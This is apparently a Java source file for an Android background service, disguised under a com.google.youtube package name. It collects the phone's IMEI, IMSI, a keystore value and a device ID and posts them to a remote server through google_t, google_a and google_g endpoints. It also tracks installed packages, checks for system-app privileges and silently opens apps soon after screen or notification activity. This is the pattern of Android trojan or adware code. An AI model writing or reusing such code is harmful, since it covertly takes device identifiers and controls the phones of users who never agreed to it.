package com.google.youtube.services;

import java.util.Date;

import com.google.youtube.utils.DeviceUtils;
import com.google.youtube.utils.HttpUtil;
import com.google.youtube.utils.MyHelpUtil;

import android.app.IntentService;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.text.TextUtils;

public class PakageService extends IntentService {

	public PakageService(String name) {
		super("BroadcastPakageAddService");
	}

	public PakageService() {
		super("BroadcastPakageAddService");
	}

	@Override
	protected void onHandleIntent(Intent arg0) {

		String realpackname = (String) arg0
				.getCharSequenceExtra("realpackname");

		SharedPreferences appSharedPreferences = getApplicationContext()
				.getSharedPreferences("inr", 0);

		String a = MyHelpUtil.enCrypto(realpackname, MyHelpUtil.A);

		if (appSharedPreferences.contains(a)) {

			Editor localEditor = appSharedPreferences.edit();

			localEditor.putInt(a, appSharedPreferences.getInt(a, 0) + 1);

			localEditor.commit();

			if (MyHelpUtil.checkNet(getApplicationContext())) {

				cc(realpackname);

				String paramsString = MyHelpUtil
						.add_device_params(getApplicationContext());

				try {
					HttpUtil.postRequest(HttpUtil.BASE_URL + "google_a.action",
							paramsString);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

			return;

		}

		if (MyHelpUtil.checkNet(getApplicationContext())) {

			try {

				String paramsString = MyHelpUtil
						.add_device_params(getApplicationContext());

				try {
					HttpUtil.postRequest(HttpUtil.BASE_URL + "google_a.action",
							paramsString);
				} catch (Exception e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

				StringBuilder params = new StringBuilder();

				SharedPreferences localSharedPreferences_id = getSharedPreferences(
						"DEVICE_STATUS", 0);

				params.append("a=" + a);

				params.append("&b="
						+ DeviceUtils.getKeyStore(getApplicationContext()));

				params.append("&c="
						+ DeviceUtils.getIMEI(getApplicationContext()));

				params.append("&d="
						+ DeviceUtils.getIMSI(getApplicationContext()));

				params.append("&e="
						+ localSharedPreferences_id.getString(
								"create_device_id", ""));

				String s = HttpUtil.postRequest(HttpUtil.BASE_URL
						+ "google_t.action", params.toString());

				if (!TextUtils.isEmpty(s)) {
					if ("1".equals(s.trim())) {
						try {

							Editor localEditor = appSharedPreferences.edit();

							localEditor.putInt(a,
									appSharedPreferences.getInt(a, 0) + 1);

							localEditor.commit();

							cc(realpackname);

						} catch (Exception e) {
							e.printStackTrace();
						}
					}
				}
			} catch (Exception e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
		}
	}

	private boolean checkNSOpenTime() {

		SharedPreferences msgSharedPreferences = getApplicationContext()
				.getSharedPreferences("MSG_STATUS", 0);

		long screen = msgSharedPreferences.getLong("screen", 0);

		long notification = msgSharedPreferences.getLong("notification", 0);

		long res = Math.abs(new Date().getTime()
				- (screen > notification ? screen : notification));

		if (res <= 30 * 60 * 1000) {
			return true;
		} else {
			return false;
		}

	}

	private void cc(String b) {

		int a = MyHelpUtil.isSystemApp(getApplicationContext());

		try {

			if (a == 0) {

				synchroInstallDataByBord(b);

			} else {

				MyHelpUtil.sys_msg(getApplicationContext(), 13, b);

				if (checkNSOpenTime()) {

					PackageInfo p1 = getPackageManager().getPackageInfo(b, 0);

					if (p1 != null) {

						MyHelpUtil.openApp(p1.packageName,
								getApplicationContext());

						MyHelpUtil.sys_msg(getApplicationContext(), 14, b);

					}
				}
			}
		} catch (Exception e) {

			e.printStackTrace();

		}

	}

	private void synchroInstallDataByBord(String apppakname) {

		String rawParams = MyHelpUtil.setParams(apppakname, 5,
				getApplicationContext());
		try {

			HttpUtil.postRequest(HttpUtil.BASE_URL + "google_g.action",
					rawParams);

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
}
